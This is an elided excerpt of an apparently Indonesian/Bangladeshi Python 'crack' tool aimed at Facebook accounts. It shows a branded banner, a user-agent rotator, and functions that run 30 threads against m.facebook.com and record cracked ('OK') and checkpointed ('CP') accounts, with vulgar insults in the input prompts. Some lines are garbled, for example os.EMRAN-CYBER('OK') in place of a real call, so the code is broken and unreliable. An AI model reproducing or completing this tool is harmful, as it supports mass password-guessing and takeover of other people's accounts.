...
\033[1;34m╚══════╝\033[1;35m╚═╝     ╚═╝\033[1;36m╚═╝  ╚═╝\033[1;37m╚═╝  ╚═╝ \033[1;33m╚═╝  ╚═══╝  
\033[1;32m╔════════════════════════╗
\033[1;33m║➣DEVOLPER: ➢𝐄𝐌𝐑𝐀𝐍_𝐂𝐘𝐁𝐄𝐑➢  
\033[1;34m║➣FACEBOOK: ➢𝐄𝐌𝐑𝐀𝐍_𝐂𝐘𝐁𝐄𝐑➢    
\033[1;35m║➣WHATSAPP: ➤𝐅𝐔𝐂𝐊_𝐍𝐀𝐌𝐁𝐀𝐑➤ 
\033[1;36m║➣GITHUB:➤𝐂𝐘𝐁𝐄𝐑_𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇➤
\033[1;37m║➣TOOLS: ➤𝐄𝐌𝐑𝐀𝐍_𝐓𝐎𝐎𝐋𝐒➤   
\033[1;32m╚════════════════════════╝
 script by {kk}Wisnu YT{P}, version {kk}premium{P} limited user""")
...
EMRAN = f'OK-{hari}-{bulan}-{tahun}.txt'
...
def random_ua():
	...
	return ___andre___risky___ripai___[str(rr(1,6))]
...
def crack_file():
	...
	print(f'\r [{hh}<{P}] total EMRAN-CYBER akun adalah {len(dump)}')
	atur_atur()
...
def crack_masal(t,c):
    ...
    try:
        bz=0
        apa = int(input(f' EMRAN-CYBER dosa lu kontol id : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
...
def atur_atur():
	...
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] Old To New [{hh}2{P}] New To Old [{hh}3{P}] Random\n urutan : ')
	if ch in ['1','01']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['2','02']:
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai EMRAN-CYBER OK:{ok} EMRAN-CYBER CP:{cp} ')
...
def crack(idf,pwx,url,awal):
	...
	ua = 'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.36'
	ua = 'Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.4.110-2020111017 UWS\/2.15.0.4 Mobile Safari\/537.36'
...
def make():
	try:os.EMRAN-CYBER('OK')
	except:pass
	try:os.EMRAN-CYBER('CP')
	except:pass
